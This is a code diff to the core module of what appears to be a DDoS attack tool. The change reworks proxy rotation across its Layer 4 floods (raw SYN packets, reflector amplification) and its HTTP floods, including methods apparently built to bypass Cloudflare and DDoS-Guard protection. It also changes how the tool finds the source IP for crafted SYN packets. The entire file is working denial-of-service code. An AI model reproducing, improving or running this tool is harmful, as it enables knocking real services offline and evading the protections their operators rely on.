@@ -13,16 +13,17 @@ from ssl import CERT_NONE, SSLContext, create_default_context
 from sys import exit as _exit
 from threading import Event
 from time import sleep, time
-from typing import Any, List, Optional, Set, Tuple
+from typing import Any, List, Set, Tuple
 from urllib import parse
 
 from cloudscraper import create_scraper
-from requests import Response, Session, get, cookies
+from requests import Response, Session, cookies
 from yarl import URL
 
-from PyRoxy import Proxy, Tools as ProxyTools
+from PyRoxy import Tools as ProxyTools
 from .ImpactPacket import IP, TCP, UDP, Data
 from .core import cl, logger, ROOT_DIR, Stats
+from .proxies import NoProxy
 
 from .referers import REFERERS
 from .useragents import USERAGENTS
@@ -39,26 +40,9 @@ ctx.set_ciphers("DEFAULT")
 
 SOCK_TIMEOUT = 8
 
-__ip__: Optional[str] = None
-
-
-def getMyIPAddress():
-    global __ip__
-    if __ip__:
-        return __ip__
-    with suppress(Exception):
-        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
-    with suppress(Exception):
-        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
-    with suppress(Exception):
-        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
-    with suppress(Exception):
-        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
-    with suppress(Exception):
-        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
-    with suppress(Exception):
-        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
-    return getMyIPAddress()
+with socket(AF_INET, SOCK_DGRAM) as s:
+    s.connect(("8.8.8.8", 80))
+    __ip__ = s.getsockname()[0]
 
 
 def exit(*message):
@@ -127,10 +111,11 @@ class Tools:
         return str(ProxyTools.Random.rand_str(lengh)).strip()
 
     @staticmethod
-    def parse_params(url, ip, proxies):
+    def parse_params(url, ip, get_proxy):
         result = url.host.lower().endswith(rotate_suffix)
-        if result: return choice(rotate_params), []
-        return (url, ip), proxies
+        if result:
+            return choice(rotate_params), lambda: NoProxy
+        return (url, ip), get_proxy
 
     @staticmethod
     def send(sock: socket, packet: bytes, stats: Stats):
@@ -212,7 +197,6 @@ class Layer4:
     _ref: Any
     SENT_FLOOD: Any
     _amp_payloads = cycle
-    _proxies: List[Proxy] = None
 
     def __init__(
         self,
@@ -220,7 +204,7 @@ class Layer4:
         ref: List[str],
         method: str,
         event: Event,
-        proxies: List[Proxy],
+        get_proxy: callable,
         stats: Stats,
     ):
         self._amp_payload = None
@@ -230,8 +214,7 @@ class Layer4:
         self._target = target
         self._event = event
         self._stats = stats
-        if proxies:
-            self._proxies = proxies
+        self._get_proxy = get_proxy
         self.select(self._method)
 
     def run(self) -> int:
@@ -241,15 +224,11 @@ class Layer4:
                         conn_type=AF_INET,
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
-        if self._proxies:
-            s = randchoice(self._proxies).open_socket(
-                conn_type, sock_type, proto_type)
-        else:
-            s = socket(conn_type, sock_type, proto_type)
-        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        s.settimeout(SOCK_TIMEOUT)
-        s.connect(self._target)
-        return s
+        sock = self._get_proxy().open_socket(conn_type, sock_type, proto_type)
+        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        sock.settimeout(SOCK_TIMEOUT)
+        sock.connect(self._target)
+        return sock
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
@@ -385,7 +364,7 @@ class Layer4:
 
     def _generate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(getMyIPAddress())
+        ip.set_ip_src(__ip__)
         ip.set_ip_dst(self._target[0])
         tcp: TCP = TCP()
         tcp.set_SYN()
@@ -413,7 +392,6 @@ class Layer4:
 
 
 class HttpFlood:
-    _proxies: List[Proxy] = None
     _payload: str
     _defaultpayload: Any
     _req_type: str
@@ -434,7 +412,7 @@ class HttpFlood:
         event: Event,
         useragents: List[str],
         referers: List[str],
-        proxies: List[Proxy],
+        get_proxy: callable,
         stats: Stats
     ) -> None:
         self.SENT_FLOOD = None
@@ -451,8 +429,7 @@ class HttpFlood:
 
         self._referers = referers
         self._useragents = useragents
-        if proxies:
-            self._proxies = proxies
+        self._get_proxy = get_proxy
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                       target.raw_path_qs, randchoice(['1.1', '1.2']))
@@ -491,11 +468,7 @@ class HttpFlood:
                            "\r\n"))
 
     def open_connection(self) -> socket:
-        if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
-        else:
-            sock = socket(AF_INET, SOCK_STREAM)
-
+        sock = self._get_proxy().open_socket(AF_INET, SOCK_STREAM)
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         sock.settimeout(SOCK_TIMEOUT)
         sock.connect(self._raw_target)
@@ -677,9 +650,7 @@ class HttpFlood:
         return packets
 
     def CFB(self) -> int:
-        proxies = None
-        if self._proxies:
-            proxies = randchoice(self._proxies).asRequest()
+        proxies = self._get_proxy().asRequest()
         s, packets = None, 0
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
@@ -718,11 +689,7 @@ class HttpFlood:
         return packets
 
     def DGB(self) -> int:
-        proxies = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-            proxies = pro.asRequest()
-
+        proxies = self._get_proxy().asRequest()
         ua = randchoice(self._useragents)
         s, packets = None, 0
         with suppress(Exception), Tools.dgb_solver(self._target.human_repr(), ua, proxies) as s:
@@ -773,9 +740,7 @@ class HttpFlood:
         return packets
 
     def BYPASS(self) -> int:
-        proxies = None
-        if self._proxies:
-            proxies = randchoice(self._proxies).asRequest()
+        proxies = self._get_proxy().asRequest()
         s, packets = None, 0
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
@@ -894,13 +859,13 @@ class HttpFlood:
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
 
 
-def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
+def main(url, ip, method, event, get_proxy, stats, rpc=None, refl_li_fn=None):
     if method not in Methods.ALL_METHODS:
         exit(f"Method {method} Not Found")
 
-    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
+    (url, ip), get_proxy = Tools.parse_params(url, ip, get_proxy)
     if method in Methods.LAYER7_METHODS:
-        return HttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
+        return HttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, get_proxy, stats)
 
     if method in Methods.LAYER4_METHODS:
         port = url.port
@@ -927,4 +892,4 @@ def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
             if not ref:
                 exit("Empty Reflector File ")
 
-        return Layer4((ip, port), ref, method, event, proxies, stats)
+        return Layer4((ip, port), ref, method, event, get_proxy, stats)
